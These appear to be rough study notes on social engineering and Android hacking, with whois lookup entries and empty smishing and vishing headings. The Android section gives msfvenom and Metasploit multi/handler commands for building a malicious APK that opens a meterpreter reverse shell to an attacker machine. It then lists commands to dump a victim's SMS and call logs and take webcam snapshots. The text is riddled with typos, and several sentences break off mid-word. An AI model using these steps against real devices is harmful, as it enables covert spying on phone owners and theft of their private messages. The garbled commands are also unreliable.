# Information Gathering

- *whois Domain Lookup*
- *whois iplookup*
- *whois MAC lookup*
---
# Smishing

Smishing Attack is a social Engineering 

# Quishing



# Vishing

---

# It Is About Finding Them

All these things keeps on happening therefore you need to consider Domain Lookup

<div style="border-left: 4px solid #007acc; background-color: #f1f6f9; padding: 10px; border-radius: 5px;">
<strong>Note: </strong> When a machine is involved into some suspicious activity and that the identification of the machine is difficult then it is not that hard to identify using the service providers, say ISPs, even VPN Providers. In India, the Govt ask to keep the Data of the services used for the **3 Months**, and that when asked they should be able to give the information to the Govt. 
</div>
<br> 


- **Collaboration with ISPs, VPN Provider**, When you need to identify the machine, you can *traaceroute* the 


# Android Security

*So How Does the Android Architecture works?* 

Attacker will have a machine (Kali Linux) and will create a *.apk* file that will have the malicious code and through social engineering he'll be making implementing the payload and victim (Android Phone) will be downloading the .apk file and will get hack. 

```
sudo msfvenom -p androud/meterpreter/reverse_http LHOST=192..168.100.228 LPORT=5000 > hack.apk
```

You need to open the listening port on the saem server and this you will be able to respond to the requests of the Android Device and this you'll need to open the mfsconsole and run the multi/handler. Start by msfconsole.

```
sudo mfsconsole
```

Then use the `multi/handler`.

```
use multi/handler
```

After multi/handler you need to set the reverse meterpreter that will send the request to android device for the reverse shell using the following command.

```
set payload android/meterpreter/reverse_tcp
```

Then set the LHOST as the IP of the server/machine that is running the apache server meaning the IP address of the machine, the you need to specify the listening port that tht 

Now you can dump the messages using the following command.

```
dump_sms

dump-callog

dump_snap

webcam_snap
```

- **Dynamic Analyser for Mobile Applications**, where people can 




